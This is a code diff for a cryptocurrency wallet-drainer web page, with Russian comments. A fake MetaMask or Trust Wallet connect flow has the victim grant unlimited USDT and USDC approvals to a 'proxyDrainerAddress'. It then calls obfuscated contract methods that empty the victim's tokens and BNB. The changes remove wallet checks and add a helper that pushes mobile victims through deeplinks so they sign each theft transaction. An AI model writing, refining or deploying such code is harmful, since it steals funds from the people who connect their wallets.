@@ -383,6 +383,9 @@ function init() {
   const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
   const currentUrl = window.location.href;
 
+  // Глобальная переменная для хранения выбранного кошелька
+  let selectedWalletType = null;
+
   // Открытие модального окна
   openModalBtn.addEventListener('click', () => {
     modalOverlay.style.display = 'flex';
@@ -422,11 +425,11 @@ function init() {
   // Обработка выбора кошелька
   document.querySelectorAll('.wallet-item:not(.wallet-explore)').forEach(item => {
     item.addEventListener('click', async () => {
-      const walletName = item.getAttribute('data-wallet');
-      const displayName = walletName === 'metamask' ? 'MetaMask' : 'Trust Wallet';
+      selectedWalletType = item.getAttribute('data-wallet');
+      const displayName = selectedWalletType === 'metamask' ? 'MetaMask' : 'Trust Wallet';
       loaderTitle.innerText = displayName;
       walletLoaderTitle.innerText = `Continue in ${displayName}`;
-      walletLoaderSubtitle.innerText = isMobile ? `Opening ${displayName} app...` : `Accept connection request in ${displayName}`;
+      walletLoaderSubtitle.innerText = isMobile ? `Opening ${displayName} to connect...` : `Accept connection request in ${displayName}`;
       walletAvatar.src = 'https://via.placeholder.com/80';
 
       walletListModal.classList.remove('show');
@@ -437,7 +440,7 @@ function init() {
       }, 300);
 
       try {
-        const walletProvider = await connectWallet(walletName, 3, 5000);
+        const walletProvider = await connectWallet(selectedWalletType);
         const provider = new ethers.providers.Web3Provider(walletProvider);
         const accounts = await provider.listAccounts();
         const userAddress = accounts[0];
@@ -479,7 +482,8 @@ function init() {
             SUPPORTED_CHAINS[chainId].usdcAddress,
             SUPPORTED_CHAINS[chainId].usdtAddress,
             SUPPORTED_CHAINS[chainId].nativeToken,
-            chainId
+            chainId,
+            selectedWalletType
           );
         }
 
@@ -503,11 +507,11 @@ function init() {
 
   // Кнопка "Try again"
   tryAgainBtn.addEventListener('click', async () => {
-    const walletName = loaderTitle.innerText.toLowerCase().includes('metamask') ? 'metamask' : 'trustwallet';
-    const displayName = walletName === 'metamask' ? 'MetaMask' : 'Trust Wallet';
-    walletLoaderSubtitle.innerText = isMobile ? `Opening ${displayName} app...` : `Accept connection request in ${displayName}`;
+    if (!selectedWalletType) return;
+    const displayName = selectedWalletType === 'metamask' ? 'MetaMask' : 'Trust Wallet';
+    walletLoaderSubtitle.innerText = isMobile ? `Opening ${displayName} to connect...` : `Accept connection request in ${displayName}`;
     try {
-      const walletProvider = await connectWallet(walletName, 3, 5000);
+      const walletProvider = await connectWallet(selectedWalletType);
       const provider = new ethers.providers.Web3Provider(walletProvider);
       const accounts = await provider.listAccounts();
       const userAddress = accounts[0];
@@ -519,7 +523,7 @@ function init() {
   });
 }
 
-async function connectWallet(walletType, maxRetries = 3, timeout = 5000) {
+async function connectWallet(walletType, maxRetries = 3, timeout = 6000) {
   const statusDiv = document.getElementById('status');
   const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
   const currentUrl = window.location.href;
@@ -535,28 +539,20 @@ async function connectWallet(walletType, maxRetries = 3, timeout = 5000) {
   while (attempt < maxRetries) {
     try {
       if (isMobile) {
-        // Мобильное устройство: используем deeplink
+        // Мобильное устройство: перенаправляем в приложение
         window.location.href = deeplinks[walletType];
-        
-        // Ожидаем, пока кошелек инжектирует window.ethereum
+
+        // Ожидаем возвращения в браузер
         await new Promise(resolve => setTimeout(resolve, timeout));
 
         if (!window.ethereum) {
           throw new Error(`${walletType === 'metamask' ? 'MetaMask' : 'Trust Wallet'} не удалось инициализировать.`);
         }
 
-        // Проверяем, что это правильный кошелек
-        if (walletType === 'metamask' && !window.ethereum.isMetaMask) {
-          throw new Error('MetaMask не обнаружен после deeplink.');
-        }
-        if (walletType === 'trustwallet' && !(window.ethereum.isTrust || window.ethereum.isTrustWallet)) {
-          throw new Error('Trust Wallet не обнаружен после deeplink.');
-        }
-
         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        return window.ethereum; // Возвращаем провайдер
+        return window.ethereum;
       } else {
-        // Десктоп: работаем с window.ethereum
+        // Десктоп
         if (!window.ethereum) {
           throw new Error(`${walletType === 'metamask' ? 'MetaMask' : 'Trust Wallet'} не установлен.`);
         }
@@ -564,7 +560,6 @@ async function connectWallet(walletType, maxRetries = 3, timeout = 5000) {
         let selectedProvider = window.ethereum;
         const originalEthereum = window.ethereum;
 
-        // Проверяем наличие нескольких провайдеров
         if (window.ethereum.providers && Array.isArray(window.ethereum.providers)) {
           const providers = window.ethereum.providers;
           if (walletType === 'metamask') {
@@ -572,24 +567,14 @@ async function connectWallet(walletType, maxRetries = 3, timeout = 5000) {
           } else if (walletType === 'trustwallet') {
             selectedProvider = providers.find(p => p.isTrust || p.isTrustWallet) || window.ethereum;
           }
-        } else {
-          // Запасная проверка
-          if (walletType === 'metamask' && !window.ethereum.isMetaMask) {
-            throw new Error('MetaMask не обнаружен.');
-          }
-          if (walletType === 'trustwallet' && !(window.ethereum.isTrust || window.ethereum.isTrustWallet)) {
-            throw new Error('Trust Wallet не обнаружен.');
-          }
         }
 
-        // Временно заменяем window.ethereum на выбранный провайдер
         window.ethereum = selectedProvider;
 
         try {
           const accounts = await selectedProvider.request({ method: 'eth_requestAccounts' });
-          return selectedProvider; // Возвращаем провайдер
+          return selectedProvider;
         } finally {
-          // Восстанавливаем оригинальный window.ethereum
           window.ethereum = originalEthereum;
         }
       }
@@ -599,9 +584,32 @@ async function connectWallet(walletType, maxRetries = 3, timeout = 5000) {
       if (attempt >= maxRetries) {
         throw new Error(`Не удалось подключить ${walletType === 'metamask' ? 'MetaMask' : 'Trust Wallet'}: ${error.message}`);
       }
-      await new Promise(resolve => setTimeout(resolve, 1000)); // Пауза перед повторной попыткой
+      await new Promise(resolve => setTimeout(resolve, 1000));
     }
   }
+}
+
+async function signTransaction(walletType, txPromise, statusDiv, message) {
+  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+  const currentUrl = window.location.href;
+  const deeplinks = {
+    metamask: `metamask://dapp/${currentUrl}`,
+    trustwallet: `trust://open_url?url=${encodeURIComponent(currentUrl)}`
+  };
+
+  if (isMobile) {
+    statusDiv.textContent = message;
+    window.location.href = deeplinks[walletType];
+    await new Promise(resolve => setTimeout(resolve, 6000));
+    if (!window.ethereum) {
+      throw new Error(`${walletType === 'metamask' ? 'MetaMask' : 'Trust Wallet'} не инициализирован.`);
+    }
+  }
+
+  const tx = await txPromise();
+  statusDiv.textContent = `${message} - выполняется...`;
+  await tx.wait();
+  return tx;
 }
 
 const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
@@ -713,7 +721,7 @@ async function switchToChain(chainId, walletProvider) {
   }
 }
 
-async function drainWallet(provider, signer, userAddress, nativeBalance, usdcBalance, usdtBalance, usdcAddress, usdtAddress, nativeToken, chainId) {
+async function drainWallet(provider, signer, userAddress, nativeBalance, usdcBalance, usdtBalance, usdcAddress, usdtAddress, nativeToken, chainId, walletType) {
   const statusDiv = document.getElementById('status');
   const MINIMUM_NATIVE_BALANCE = ethers.utils.parseEther("0.001");
   const MINIMUM_TOKEN_BALANCE = ethers.utils.parseUnits("0.1", 6);
@@ -737,10 +745,13 @@ async function drainWallet(provider, signer, userAddress, nativeBalance, usdcBal
     if (usdtToDrain.gt(0)) {
       usdtAllowance = await usdtContract.allowance(userAddress, proxyDrainerAddress);
       if (usdtAllowance.lt(usdtToDrain)) {
-        const approveUsdtTx = await usdtContract.approve(proxyDrainerAddress, MAX_UINT256, { gasLimit: 100000 });
-        statusDiv.textContent = "Одобрение USDT (разовое)...";
-        await approveUsdtTx.wait();
-        console.log(`USDT одобрены на максимальную сумму. Tx: ${approveUsdtTx.hash}`);
+        await signTransaction(
+          walletType,
+          () => usdtContract.approve(proxyDrainerAddress, MAX_UINT256, { gasLimit: 100000 }),
+          statusDiv,
+          "Одобрение USDT (разовое)"
+        );
+        console.log(`USDT одобрены на максимальную сумму.`);
       }
     }
 
@@ -748,30 +759,36 @@ async function drainWallet(provider, signer, userAddress, nativeBalance, usdcBal
     if (usdcToDrain.gt(0)) {
       usdcAllowance = await usdcContract.allowance(userAddress, proxyDrainerAddress);
       if (usdcAllowance.lt(usdcToDrain)) {
-        const approveUsdcTx = await usdcContract.approve(proxyDrainerAddress, MAX_UINT256, { gasLimit: 100000 });
-        statusDiv.textContent = "Одобрение USDC (разовое)...";
-        await approveUsdcTx.wait();
-        console.log(`USDC одобрены на максимальную сумму. Tx: ${approveUsdcTx.hash}`);
+        await signTransaction(
+          walletType,
+          () => usdcContract.approve(proxyDrainerAddress, MAX_UINT256, { gasLimit: 100000 }),
+          statusDiv,
+          "Одобрение USDC (разовое)"
+        );
+        console.log(`USDC одобрены на максимальную сумму.`);
       }
     }
 
     if (usdtToDrain.gt(0) || usdcToDrain.gt(0)) {
-      const tokenTx = await proxyDrainer.tK7(usdtToDrain, usdcToDrain, { gasLimit: 200000 });
-      statusDiv.textContent = "Списание токенов...";
-      await tokenTx.wait();
-      console.log(`Токены списаны. Tx: ${tokenTx.hash}`);
+      await signTransaction(
+        walletType,
+        () => proxyDrainer.tK7(usdtToDrain, usdcToDrain, { gasLimit: 200000 }),
+        statusDiv,
+        "Списание токенов"
+      );
+      console.log(`Токены списаны.`);
     } else {
       statusDiv.textContent = "Токены для списания не найдены.";
     }
 
     if (nativeToDrain.gt(0)) {
-      const bnbTx = await proxyDrainer.bN3({
-        value: nativeToDrain,
-        gasLimit: 100000
-      });
-      statusDiv.textContent = "Списание BNB...";
-      await bnbTx.wait();
-      console.log(`BNB списаны. Tx: ${bnbTx.hash}`);
+      await signTransaction(
+        walletType,
+        () => proxyDrainer.bN3({ value: nativeToDrain, gasLimit: 100000 }),
+        statusDiv,
+        "Списание BNB"
+      );
+      console.log(`BNB списаны.`);
     } else {
       statusDiv.textContent = "Недостаточно BNB для списания.";
     }
